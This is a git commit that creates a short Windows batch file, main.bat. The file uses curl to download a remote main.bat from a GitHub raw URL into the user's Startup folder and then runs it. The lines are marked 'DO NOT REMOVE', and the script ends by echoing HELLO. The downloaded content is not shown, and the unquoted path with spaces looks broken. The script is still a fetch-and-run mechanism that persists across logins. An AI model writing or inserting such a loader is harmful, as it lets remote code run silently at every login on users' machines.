24192f6876aad18b15e78caecce2162bb4a3c991
eamonhinton <neontechnologyimports@gmail.com>
2024-09-30 18:07:28 -0400

    Create main.bat

---
+++ main.bat
@@ -0,0 +1,6 @@
+REM DO NOT REMOVE
+curl -o C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup https://raw.githubusercontent.com/eamonhinton/instruction-sets/main/main.bat
+call C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+REM DO NOT REMOVE
+echo HELLO
+pause
